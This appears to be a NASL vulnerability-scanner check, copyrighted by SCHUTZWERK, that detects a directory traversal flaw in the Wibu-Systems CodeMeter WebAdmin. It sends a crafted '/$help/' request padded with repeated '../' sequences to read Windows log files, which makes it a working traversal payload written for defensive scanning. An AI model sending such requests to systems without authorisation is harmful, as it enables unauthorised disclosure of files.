CPE = "cpe:/a:wibu:codemeter_webadmin";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.111103" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2016-06-07 16:30:00 +0200 (Tue, 07 Jun 2016)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_bugtraq_id( 49437 );
	script_name( "Wibu-Systems CodeMeter License Server Directory Traversal Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2016 SCHUTZWERK GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_codemeter_webadmin_detect.sc" );
	script_mandatory_keys( "wibu/codemeter_webadmin/detected" );
	script_require_ports( "Services/www", 22350, 22352, 22353 );
	script_tag( name: "summary", value: "Wibu-Systems CodeMeter is prone to a directory-traversal
  vulnerability because it fails to sufficiently sanitize user-supplied input." );
	script_tag( name: "vuldetect", value: "Send a crafted HTTP GET request and
  check whether it is able to get sensitive information." );
	script_tag( name: "impact", value: "Exploiting this issue can allow an attacker to download arbitrary
  files with certain extensions from outside the server root directory. This may aid in further attacks.

  The limitation of the attack is caused by a list of allowed extensions like txt, htm, html, images and so on." );
	script_tag( name: "affected", value: "Wibu-Systems CodeMeter 4.30c is affected. Other versions may also be vulnerable." );
	script_tag( name: "solution", value: "Upgrade to Wibu-Systems CodeMeter 4.30d or later." );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/49437" );
	script_xref( name: "URL", value: "http://aluigi.altervista.org/adv/codemeter_1-adv.txt" );
	script_tag( name: "qod_type", value: "remote_app" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
files = make_array( "Time,File,Line,Tag,Message", "WINDOWS/setuplog.txt", "\\[SusClientUpdate\\]", "WINDOWS/SoftwareDistribution/SelfUpdate/wuident.txt", "\\[SusClientUpdate\\]", "WINDOWS/SoftwareDistribution/SelfUpdate/Default/wuident.txt" );
for file in keys( files ) {
	url = dir + "/$help/" + crap( data: "../", length: 120 ) + files[file];
	if(http_vuln_check( port: port, url: url, pattern: file )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

